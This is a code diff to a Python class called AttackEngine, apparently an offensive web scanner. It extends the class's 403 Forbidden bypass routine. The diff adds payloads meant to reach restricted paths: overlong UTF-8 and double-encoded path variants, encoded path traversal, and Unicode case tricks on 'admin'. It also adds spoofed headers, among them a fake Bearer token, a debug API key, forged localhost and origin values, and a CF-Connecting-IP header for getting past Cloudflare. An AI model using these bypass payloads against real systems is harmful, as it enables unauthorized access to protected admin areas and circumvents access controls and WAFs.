@@ -142,7 +142,6 @@ class AttackEngine:
         except Exception as e:
             self.console.print_error(f"Unexpected error during request to {url} [{payload_info}]: {e}")
             return None
-         
 
     async def handle_forbidden(self, url: str) -> bool:
         """Attempts to bypass 403 Forbidden using custom techniques via httpx."""
@@ -162,6 +161,10 @@ class AttackEngine:
             f"{path}/.", f"{path}/..;", f"{path}..;", f"{path}//", f"{path}/%2e/",
             f"{path}.json", f"{path}.xml", f"{path}.config", f"{path}.bak", f"{path}.old",
             path.upper(), path.lower(),
+            path.replace('a', '%c0%a0'),  # Caracteres Unicode similares
+            path.replace('admin', 'AdMïn'),  # Mayúsculas/minúsculas + Unicode
+            f"{path}%252f",               # Codificación doble
+            f"{path}/%2e%2e%2f",          # Path traversal codificado
         ]
         if any(c.isalpha() for c in path) and path != path.upper():
              paths_to_try.append(''.join(random.choice([c.upper(), c.lower()]) for c in path))
@@ -178,6 +181,12 @@ class AttackEngine:
             {"X-Real-IP": "127.0.0.1"}, {"X-Host": original_parsed.netloc}, {"Host": "localhost"},
             {"Content-Length": "0"},
             {"Cookie": "isAdmin=true; role=admin"},
+            {"Authorization": "Bearer NULL"},  # Token falso
+            {"X-API-Key": "debug"},            # API key de depuración
+            {"X-Requested-With": "XMLHttpRequest"},  # Bypass WAFs que ignoran AJAX
+            {"X-Origin": "trusted-domain.com"},      # Forzar origen confiable
+            {"X-Forwarded-Host": "localhost"},       # Bypass basado en Host
+            {"CF-Connecting-IP": "127.0.0.1"},       # Bypass Cloudflare
         ]
         for h in headers_to_try:
              method = "POST" if "Content-Length" in h else "GET"
